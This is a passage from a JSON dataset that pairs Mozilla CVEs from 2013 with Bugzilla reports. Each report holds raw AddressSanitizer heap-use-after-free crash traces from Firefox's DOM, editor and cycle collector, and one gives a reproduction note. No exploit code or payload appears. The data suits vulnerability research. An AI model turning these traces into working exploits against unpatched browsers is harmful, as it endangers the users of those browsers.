browser/app/nsBrowserApp.cpp:576 #24 0x7f37b6ac576c in #25 0x424584 in 0x6048007cc018 is located 24 bytes inside of 472-byte region [0x6048007cc000,0x6048007cc1d8) freed by thread T0 here: #0 0x4183f2 in __interceptor_free #1 0x7f37b483f6ce in moz_free memory/mozalloc/mozalloc.cpp:48 #2 0x7f379a6e7cc9 in operator delete(void*) ../../../../dist/include/mozilla/mozalloc.h:225 #3 0x7f379a6e7cc9 in mozilla::dom::HTMLVideoElement::~HTMLVideoElement() content/html/content/src/HTMLVideoElement.cpp:78 #4 0x7f3798cef9c5 in nsNodeUtils::LastRelease(nsINode*) content/base/src/nsNodeUtils.cpp:258 #5 0x7f3798f9a2fa in mozilla::dom::FragmentOrElement::Release() content/base/src/FragmentOrElement.cpp:1716 #6 0x7f379a044d75 in mozilla::dom::HTMLMediaElement::Release() content/html/content/src/HTMLMediaElement.cpp:402 #7 0x7f379a6e3c85 in mozilla::dom::HTMLVideoElement::Release() content/html/content/src/HTMLVideoElement.cpp:42 #8 0x7f379dd4e4a0 in _ZL17DoDeferredReleaseIP11nsISupportsEvR8nsTArrayIT_E js/xpconnect/src/XPCJSRuntime.cpp:614 #9 0x7f379dd4d971 in XPCJSRuntime::GCCallback(JSRuntime*, JSGCStatus) js/xpconnect/src/XPCJSRuntime.cpp:814 #10 0x7f37ab9e702c in Collect(JSRuntime*, bool, long, js::JSGCInvocationKind, JS::gcreason::Reason) js/src/jsgc.cpp:4611 #11 0x7f37ab9d7924 in js::GC(JSRuntime*, js::JSGCInvocationKind, JS::gcreason::Reason) js/src/jsgc.cpp:4628 #12 0x7f37ab94c4b9 in JS::GCForReason(JSRuntime*, JS::gcreason::Reason) js/src/jsfriendapi.cpp:180 #13 0x7f379dc5df7e in nsXPCComponents_Utils::ForceGC() js/xpconnect/src/XPCComponents.cpp:4106 #14 0x7f37a4182f7b in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #15 0x7f379dea35af in CallMethodHelper::Invoke() js/xpconnect/src/XPCWrappedNative.cpp:2948 #16 0x7f379dea35af in CallMethodHelper::Call() js/xpconnect/src/XPCWrappedNative.cpp:2282 #17 0x7f379dea35af in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:2248 #18 0x7f379defc7e1 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1486 #19 0x7f37abc38ccf in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:337 #20 0x7f37abc38ccf in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:407 #21 0x7f37abc121a0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2396 #22 0x7f37abbbd64d in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:364 #23 0x7f37abc39378 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:421 #24 0x7f37ab65a836 in js::Invoke(JSContext*, js::InvokeArgsGuard&, js::MaybeConstruct) js/src/jsinterp.h:134 #25 0x7f37abc3cdd0 in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:454 #26 0x7f37abf6b52d in js::DirectProxyHandler::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:481 #27 0x7f37ac5ae772 in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jswrapper.cpp:453 #28 0x7f37abfd499e in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) js/src/jsproxy.cpp:2613 #29 0x7f37abff1e9a in proxy_Call(JSContext*, unsigned int, JS::Value*) js/src/jsproxy.cpp:3177 #30 0x7f37abc385c2 in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:337 #31 0x7f37abc385c2 in js::InvokeKernel(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:400 #32 0x7f37abc121a0 in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2396 #33 0x7f37abbbd64d in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:364 #34 0x7f37abc4275b in js::ExecuteKernel(JSContext*, JS::Handle<JSScript*>, JSObject&, JS::Value const&, js::ExecuteType, js::AbstractFramePtr, JS::Value*) js/src/jsinterp.cpp:552 previously allocated by thread T0 here: #0 0x4184d2 in malloc #1 0x7f37b483f815 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 #2 0x7f379a6e34ce in operator new(unsigned long) ../../../../dist/include/mozilla/mozalloc.h:201 #3 0x7f379a6e34ce in nsGenericHTMLElement* mozilla::dom::NewHTMLElementHelper::Create<nsHTMLVideoElement, mozilla::dom::HTMLVideoElement>(already_AddRefed<nsINodeInfo>, mozilla::dom::NewHTMLElementHelper::SFINAE<bool (*)(nsIDocument*), mozilla::dom::HTMLVideoElement::InNavQuirksMode>*) content/html/content/src/nsGenericHTMLElement.h:1855 #4 0x7f379a6e32db in NS_NewHTMLVideoElement(already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/content/src/HTMLVideoElement.cpp:36 #5 0x7f379a7a8bb1 in CreateHTMLElement(unsigned int, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:498 #6 0x7f379a7a9375 in NS_NewHTMLElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:481 #7 0x7f3798cbe79a in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/base/src/nsNameSpaceManager.cpp:192 #8 0x7f379c6d9ee0 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:349 #9 0x7f379c6f89a5 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:557 #10 0x7f379c732fb2 in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:125 #11 0x7f37a4061da7 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:627 #12 0x7f37a3d0c532 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #13 0x7f37a096c8a9 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:82 #14 0x7f37a4378d1b in MessageLoop::RunInternal() ipc/chromium/src/base/message_loop.cc:219 #15 0x7f37a4378b6e in MessageLoop::RunHandler() ipc/chromium/src/base/message_loop.cc:212 #16 0x7f37a4378a59 in MessageLoop::Run() ipc/chromium/src/base/message_loop.cc:186 #17 0x7f379fd801ae in nsBaseAppShell::Run() widget/xpwidgets/nsBaseAppShell.cpp:163 #18 0x7f379ea6da40 in nsAppStartup::Run() toolkit/components/startup/nsAppStartup.cpp:289 #19 0x7f3794aadaeb in XREMain::XRE_mainRun() toolkit/xre/nsAppRunner.cpp:3878 #20 0x7f3794ab31b0 in XREMain::XRE_main(int, char**, nsXREAppData const*) toolkit/xre/nsAppRunner.cpp:3945 #21 0x7f3794ab5e75 in XRE_main toolkit/xre/nsAppRunner.cpp:4146 #22 0x427c57 in do_main(int, char**, nsIFile*) browser/app/nsBrowserApp.cpp:271 #23 0x424e11 in main browser/app/nsBrowserApp.cpp:576 #24 0x7f37b6ac576c in Shadow bytes around the buggy address: 0x0c09800f17b0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c09800f17c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c09800f17d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c09800f17e0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c09800f17f0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa =>0x0c09800f1800: fd fd fd[fd]fd fd fd fd fd fd fd fd fd fd fd fd 0x0c09800f1810: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c09800f1820: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c09800f1830: fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa fa 0x0c09800f1840: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 0x0c09800f1850: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap righ redzone: fb Freed Heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==29697== ABORTING"
      }
    ],
    "CVE-2013-1685": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=871099",
        "title": "Heap-use-after-free in nsIDocument::GetRootElement",
        "description": "==8886== ERROR: AddressSanitizer: heap-use-after-free on address 0x601c0009a3e0 at pc 0x7ffc01ebdca5 bp 0x7fff2ec8f5f0 sp 0x7fff2ec8f5e8 READ of size 8 at 0x601c0009a3e0 thread T0 #0 0x7ffc01ebdca4 in nsINode::GetParentNode() const ../../dist/include/nsINode.h:762 #1 0x7ffc03b3f9ec in nsIDocument::GetRootElement() const content/base/src/nsDocument.cpp:3610 #2 0x7ffc03b948d5 in nsIDocument::GetHtmlElement() const content/base/src/nsDocument.cpp:5819 #3 0x7ffc03b94bee in nsIDocument::GetHtmlChildElement(nsIAtom*) content/base/src/nsDocument.cpp:5828 #4 0x7ffc01f37dd5 in nsIDocument::GetBodyElement() ../../dist/include/nsIDocumentInlines.h:15 #5 0x7ffc05a4a9b6 in nsHTMLDocument::GetBody() content/html/document/src/nsHTMLDocument.cpp:1085 #6 0x7ffc05a4af0d in nsHTMLDocument::GetBody(nsIDOMHTMLElement**) content/html/document/src/nsHTMLDocument.cpp:1106 #7 0x7ffc05a4b382 in non-virtual thunk to nsHTMLDocument::GetBody(nsIDOMHTMLElement**) content/html/document/src/nsHTMLDocument.cpp:1109 #8 0x7ffc07b29165 in nsHTMLEditor::GetBodyElement(nsIDOMHTMLElement**) editor/libeditor/html/nsHTMLEditor.cpp:5288 #9 0x7ffc07b281bf in nsHTMLEditor::GetRootElement(nsIDOMElement**) editor/libeditor/html/nsHTMLEditor.cpp:336 #10 0x7ffc07b856bc in nsHTMLEditor::ResetRootElementAndEventTarget() editor/libeditor/html/nsHTMLEditor.cpp:5259 #11 0x7ffc07bc544a in nsRunnableMethodImpl<void (nsHTMLEditor::*)(), true>::Run() ../../../dist/include/nsThreadUtils.h:350 #12 0x7ffc0397bd4a in nsContentUtils::RemoveScriptBlocker() content/base/src/nsContentUtils.cpp:4971 #13 0x7ffc03b631f3 in nsDocument::EndUpdate(unsigned int) content/base/src/nsDocument.cpp:4342 #14 0x7ffc05a6b7c1 in nsHTMLDocument::EndUpdate(unsigned int) content/html/document/src/nsHTMLDocument.cpp:2580 #15 0x7ffc02793151 in mozAutoDocUpdate::~mozAutoDocUpdate() content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:38 #16 0x7ffc027657ee in mozAutoDocUpdate::~mozAutoDocUpdate() content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:36 #17 0x7ffc03b2d819 in nsDocument::ResetToURI(nsIURI*, nsILoadGroup*, nsIPrincipal*) content/base/src/nsDocument.cpp:2074 #18 0x7ffc05a34b3e in nsHTMLDocument::ResetToURI(nsIURI*, nsILoadGroup*, nsIPrincipal*) content/html/document/src/nsHTMLDocument.cpp:294 #19 0x7ffc03b2c47d in nsDocument::Reset(nsIChannel*, nsILoadGroup*) content/base/src/nsDocument.cpp:2012 #20 0x7ffc05a34692 in nsHTMLDocument::Reset(nsIChannel*, nsILoadGroup*) content/html/document/src/nsHTMLDocument.cpp:281 #21 0x7ffc05a558fd in nsHTMLDocument::Open(JSContext*, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) content/html/document/src/nsHTMLDocument.cpp:1687 #22 0x7ffc0d6a2ff6 in mozilla::dom::HTMLDocumentBinding::open(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, unsigned int, JS::Value*) objdir-ff-asan-sym/dom/bindings/HTMLDocumentBinding.cpp:524 #23 0x7ffc0d68eba5 in mozilla::dom::HTMLDocumentBinding::genericMethod(JSContext*, unsigned int, JS::Value*) objdir-ff-asan-sym/dom/bindings/HTMLDocumentBinding.cpp:1545 #24 0x7ffc172428ef in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:337 #25 0x7ffc172428ef in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:426 #26 0x7ffc1721befe in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2393 #27 0x7ffc171cb0be in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:383 #28 0x7ffc17242f98 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:440 #29 0x7ffc17246f5b in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:473 #30 0x7ffc16b72040 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) js/src/jsapi.cpp:5851 #31 0x7ffc0913a469 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) js/xpconnect/src/XPCWrappedJSClass.cpp:1435 #32 0x7ffc090ec13c in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) js/xpconnect/src/XPCWrappedJS.cpp:578 #33 0x7ffc0f776394 in PrepareAndDispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 #34 0x7ffc0f77344a in SharedStub 0x601c0009a3e0 is located 32 bytes inside of 160-byte region [0x601c0009a3c0,0x601c0009a460) freed by thread T0 here: #0 0x41a9e2 in __interceptor_free #1 0x7ffc1fff36de in moz_free memory/mozalloc/mozalloc.cpp:48 #2 0x7ffc055f9ef9 in operator delete(void*) ../../../../dist/include/mozilla/mozalloc.h:225 #3 0x7ffc055f9ef9 in mozilla::dom::HTMLSharedElement::~HTMLSharedElement() content/html/content/src/HTMLSharedElement.cpp:28 #4 0x7ffc03f12bb5 in nsNodeUtils::LastRelease(nsINode*) content/base/src/nsNodeUtils.cpp:258 #5 0x7ffc041bfe9a in mozilla::dom::FragmentOrElement::Release() content/base/src/FragmentOrElement.cpp:1713 #6 0x7ffc055fa925 in mozilla::dom::HTMLSharedElement::Release() content/html/content/src/HTMLSharedElement.cpp:32 #7 0x7ffc0021450a in nsCOMPtr_base::assign_assuming_AddRef(nsISupports*) objdir-ff-asan-sym/media/webrtc/signaling/signaling_ecc/../../../../dist/include/nsCOMPtr.h:470 #8 0x7ffc0f2a8f72 in nsCOMPtr_base::assign_with_AddRef(nsISupports*) objdir-ff-asan-sym/xpcom/build/nsCOMPtr.cpp:49 #9 0x7ffc03a2bfc4 in nsCOMPtr<mozilla::dom::Element>::operator=(mozilla::dom::Element*) ../../../../dist/include/nsCOMPtr.h:664 #10 0x7ffc07b8544a in nsHTMLEditor::ResetRootElementAndEventTarget() editor/libeditor/html/nsHTMLEditor.cpp:5251 #11 0x7ffc07bc544a in nsRunnableMethodImpl<void (nsHTMLEditor::*)(), true>::Run() ../../../dist/include/nsThreadUtils.h:350 #12 0x7ffc0397bd4a in nsContentUtils::RemoveScriptBlocker() content/base/src/nsContentUtils.cpp:4971 #13 0x7ffc03b631f3 in nsDocument::EndUpdate(unsigned int) content/base/src/nsDocument.cpp:4342 #14 0x7ffc05a6b7c1 in nsHTMLDocument::EndUpdate(unsigned int) content/html/document/src/nsHTMLDocument.cpp:2580 #15 0x7ffc02793151 in mozAutoDocUpdate::~mozAutoDocUpdate() content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:38 #16 0x7ffc027657ee in mozAutoDocUpdate::~mozAutoDocUpdate() content/xul/templates/src/../../../base/src/mozAutoDocUpdate.h:36 #17 0x7ffc03b2d819 in nsDocument::ResetToURI(nsIURI*, nsILoadGroup*, nsIPrincipal*) content/base/src/nsDocument.cpp:2074 #18 0x7ffc05a34b3e in nsHTMLDocument::ResetToURI(nsIURI*, nsILoadGroup*, nsIPrincipal*) content/html/document/src/nsHTMLDocument.cpp:294 #19 0x7ffc03b2c47d in nsDocument::Reset(nsIChannel*, nsILoadGroup*) content/base/src/nsDocument.cpp:2012 #20 0x7ffc05a34692 in nsHTMLDocument::Reset(nsIChannel*, nsILoadGroup*) content/html/document/src/nsHTMLDocument.cpp:281 #21 0x7ffc05a558fd in nsHTMLDocument::Open(JSContext*, nsAString_internal const&, nsAString_internal const&, mozilla::ErrorResult&) content/html/document/src/nsHTMLDocument.cpp:1687 #22 0x7ffc0d6a2ff6 in mozilla::dom::HTMLDocumentBinding::open(JSContext*, JS::Handle<JSObject*>, nsHTMLDocument*, unsigned int, JS::Value*) objdir-ff-asan-sym/dom/bindings/HTMLDocumentBinding.cpp:524 #23 0x7ffc0d68eba5 in mozilla::dom::HTMLDocumentBinding::genericMethod(JSContext*, unsigned int, JS::Value*) objdir-ff-asan-sym/dom/bindings/HTMLDocumentBinding.cpp:1545 #24 0x7ffc172428ef in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:337 #25 0x7ffc172428ef in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:426 #26 0x7ffc1721befe in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2393 #27 0x7ffc171cb0be in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:383 #28 0x7ffc17242f98 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:440 #29 0x7ffc17246f5b in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:473 #30 0x7ffc16b72040 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) js/src/jsapi.cpp:5851 #31 0x7ffc0913a469 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) js/xpconnect/src/XPCWrappedJSClass.cpp:1435 previously allocated by thread T0 here: #0 0x41aac2 in malloc #1 0x7ffc1fff3825 in moz_xmalloc memory/mozalloc/mozalloc.cpp:54 #2 0x7ffc055f9b9e in operator new(unsigned long) ../../../../dist/include/mozilla/mozalloc.h:201 #3 0x7ffc055f9b9e in nsGenericHTMLElement* mozilla::dom::NewHTMLElementHelper::Create<nsHTMLSharedElement, mozilla::dom::HTMLSharedElement>(already_AddRefed<nsINodeInfo>, mozilla::dom::NewHTMLElementHelper::SFINAE<bool (*)(nsIDocument*), mozilla::dom::HTMLSharedElement::InNavQuirksMode>*) content/html/content/src/nsGenericHTMLElement.h:1869 #4 0x7ffc055f99ab in NS_NewHTMLSharedElement(already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/content/src/HTMLSharedElement.cpp:20 #5 0x7ffc05a01d8e in CreateHTMLElement(unsigned int, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:498 #6 0x7ffc05a025b5 in NS_NewHTMLElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/html/document/src/nsHTMLContentSink.cpp:481 #7 0x7ffc03ee0d9a in NS_NewElement(nsIContent**, already_AddRefed<nsINodeInfo>, mozilla::dom::FromParser) content/base/src/nsNameSpaceManager.cpp:192 #8 0x7ffc079ac890 in nsHtml5TreeOperation::Perform(nsHtml5TreeOpExecutor*, nsIContent**) parser/html/nsHtml5TreeOperation.cpp:349 #9 0x7ffc079cb355 in nsHtml5TreeOpExecutor::RunFlushLoop() parser/html/nsHtml5TreeOpExecutor.cpp:557 #10 0x7ffc07a05962 in nsHtml5ExecutorFlusher::Run() parser/html/nsHtml5StreamParser.cpp:125 #11 0x7ffc0f64ede7 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:627 #12 0x7ffc0f2ebf82 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #13 0x7ffc09c2d27b in nsXULWindow::ShowModal() xpfe/appshell/src/nsXULWindow.cpp:362 #14 0x7ffc09c0c667 in nsContentTreeOwner::ShowAsModal() xpfe/appshell/src/nsContentTreeOwner.cpp:522 #15 0x7ffc09c0c818 in non-virtual thunk to nsContentTreeOwner::ShowAsModal() xpfe/appshell/src/nsContentTreeOwner.cpp:523 #16 0x7ffc09a297e0 in nsWindowWatcher::OpenWindowInternal(nsIDOMWindow*, char const*, char const*, char const*, bool, bool, bool, nsIArray*, nsIDOMWindow**) embedding/components/windowwatcher/src/nsWindowWatcher.cpp:1007 #17 0x7ffc09a1d0a4 in nsWindowWatcher::OpenWindow(nsIDOMWindow*, char const*, char const*, char const*, nsISupports*, nsIDOMWindow**) embedding/components/windowwatcher/src/nsWindowWatcher.cpp:343 #18 0x7ffc0f770ceb in NS_InvokeByIndex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 #19 0x7ffc0917c44f in CallMethodHelper::Invoke() js/xpconnect/src/XPCWrappedNative.cpp:2948 #20 0x7ffc0917c44f in CallMethodHelper::Call() js/xpconnect/src/XPCWrappedNative.cpp:2283 #21 0x7ffc0917c44f in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) js/xpconnect/src/XPCWrappedNative.cpp:2249 #22 0x7ffc091d5f41 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1485 #23 0x7ffc172428ef in js::CallJSNative(JSContext*, int (*)(JSContext*, unsigned int, JS::Value*), JS::CallArgs const&) js/src/jscntxtinlines.h:337 #24 0x7ffc172428ef in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:426 #25 0x7ffc1721befe in js::Interpret(JSContext*, js::StackFrame*, js::InterpMode, bool) js/src/jsinterp.cpp:2393 #26 0x7ffc171cb0be in js::RunScript(JSContext*, js::StackFrame*) js/src/jsinterp.cpp:383 #27 0x7ffc17242f98 in js::Invoke(JSContext*, JS::CallArgs, js::MaybeConstruct) js/src/jsinterp.cpp:440 #28 0x7ffc17246f5b in js::Invoke(JSContext*, JS::Value const&, JS::Value const&, unsigned int, JS::Value*, JS::Value*) js/src/jsinterp.cpp:473 #29 0x7ffc16b72040 in JS_CallFunctionValue(JSContext*, JSObject*, JS::Value, unsigned int, JS::Value*, JS::Value*) js/src/jsapi.cpp:5851 #30 0x7ffc0913a469 in nsXPCWrappedJSClass::CallMethod(nsXPCWrappedJS*, unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) js/xpconnect/src/XPCWrappedJSClass.cpp:1435 #31 0x7ffc090ec13c in nsXPCWrappedJS::CallMethod(unsigned short, XPTMethodDescriptor const*, nsXPTCMiniVariant*) js/xpconnect/src/XPCWrappedJS.cpp:578 #32 0x7ffc0f776394 in PrepareAndDispatch xpcom/reflect/xptcall/src/md/unix/xptcstubs_x86_64_linux.cpp:122 #33 0x7ffc0f77344a in SharedStub Shadow bytes around the buggy address: 0x0c040000b420: fa fa fa fa fd fd fd fd fd fd fd fd fd fd fd fd 0x0c040000b430: fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa fa 0x0c040000b440: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c040000b450: 00 00 00 fa fa fa fa fa fa fa fa fa 00 00 00 00 0x0c040000b460: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 =>0x0c040000b470: fa fa fa fa fa fa fa fa fd fd fd fd[fd]fd fd fd 0x0c040000b480: fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa fa 0x0c040000b490: fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 0x0c040000b4a0: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 0x0c040000b4b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c040000b4c0: fd fd fd fd fa fa fa fa fa fa fa fa fd fd fd fd Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap righ redzone: fb Freed Heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 ASan internal: fe ==8886== ABORTING"
      }
    ],
    "CVE-2013-1686": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=876155",
        "title": "Heap-use-after-free in mozilla::ResetDir",
        "description": "Need to install fuzzPriv extension to force gc and need to reload testcase 2-3 times to reproduce. ==14882== ERROR: AddressSanitizer: heap-use-after-free on address 0x60420d3f73ac at pc 0x7fa13585081c bp 0x7fff81577ef0 sp 0x7fff81577ee8 READ of size 4 at 0x60420d3f73ac thread T0 #0 0x7fa13585081b in nsINode::GetBoolFlag(nsINode::BooleanFlag) const content/base/public/nsINode.h:1359 #1 0x7fa1392dfbe3 in nsINode::HasTextNodeDirectionalityMap() const ../../../dist/include/nsINode.h:1442 #2 0x7fa1392de7b9 in mozilla::nsTextNodeDirectionalityMap::RemoveElementFromMap(nsINode*, mozilla::dom::Element*) content/base/src/DirectionalityUtils.cpp:545 #3 0x7fa1392e5bbf in mozilla::ResetDir(mozilla::dom::Element*) content/base/src/DirectionalityUtils.cpp:996 #4 0x7fa1398cbf61 in mozilla::dom::Element::UnbindFromTree(bool, bool) content/base/src/Element.cpp:1316 #5 0x7fa13a750d61 in nsGenericHTMLElement::UnbindFromTree(bool, bool) content/html/content/src/nsGenericHTMLElement.cpp:655 #6 0x7fa1398cc238 in mozilla::dom::Element::UnbindFromTree(bool, bool) content/base/src/Element.cpp:1329 #7 0x7fa13a750d61 in nsGenericHTMLElement::UnbindFromTree(bool, bool) content/html/content/src/nsGenericHTMLElement.cpp:655 #8 0x7fa1398cc238 in mozilla::dom::Element::UnbindFromTree(bool, bool) content/base/src/Element.cpp:1329 #9 0x7fa13a750d61 in nsGenericHTMLElement::UnbindFromTree(bool, bool) content/html/content/src/nsGenericHTMLElement.cpp:655 #10 0x7fa13a8ee796 in mozilla::dom::HTMLBodyElement::UnbindFromTree(bool, bool) content/html/content/src/HTMLBodyElement.cpp:357 #11 0x7fa1398cc238 in mozilla::dom::Element::UnbindFromTree(bool, bool) content/base/src/Element.cpp:1329 #12 0x7fa13a750d61 in nsGenericHTMLElement::UnbindFromTree(bool, bool) content/html/content/src/nsGenericHTMLElement.cpp:655 #13 0x7fa13b140125 in mozilla::dom::HTMLSharedElement::UnbindFromTree(bool, bool) content/html/content/src/HTMLSharedElement.cpp:305 #14 0x7fa13966120f in nsDocument::cycleCollection::UnlinkImpl(void*) content/base/src/nsDocument.cpp:1823 #15 0x7fa13b5945dc in nsHTMLDocument::cycleCollection::UnlinkImpl(void*) content/html/document/src/nsHTMLDocument.cpp:220 #16 0x7fa1450dc1be in nsCycleCollector::CollectWhite(nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:2413 #17 0x7fa1450cc583 in nsCycleCollector::FinishCollection(nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:2876 #18 0x7fa1450cae49 in nsCycleCollectorRunner::Collect(ccType, nsCycleCollectorResults*, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:1200 #19 0x7fa1450e1c80 in nsCycleCollector::Collect(ccType, nsCycleCollectorResults*, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:2772 #20 0x7fa1450e7232 in nsCycleCollector_collect(bool, nsCycleCollectorResults*, nsICycleCollectorListener*) xpcom/base/nsCycleCollector.cpp:3088 #21 0x7fa13c1aff82 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int, bool) dom/base/nsJSEnvironment.cpp:2563 #22 0x7fa13c1ed344 in CCTimerFired(nsITimer*, void*) dom/base/nsJSEnvironment.cpp:2774 #23 0x7fa145065062 in nsTimerImpl::Fire() xpcom/threads/nsTimerImpl.cpp:547 #24 0x7fa1450664bd in nsTimerEvent::Run() xpcom/threads/nsTimerImpl.cpp:634 #25 0x7fa14502bdc7 in nsThread::ProcessNextEvent(bool, bool*) xpcom/threads/nsThread.cpp:627 #26 0x7fa144cc9132 in NS_ProcessNextEvent(nsIThread*, bool) objdir-ff-asan-sym/xpcom/build/nsThreadUtils.cpp:238 #27 0x7fa14139ce24 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) ipc/glue/MessagePump.cpp:117 #28 0x7fa1453460eb in 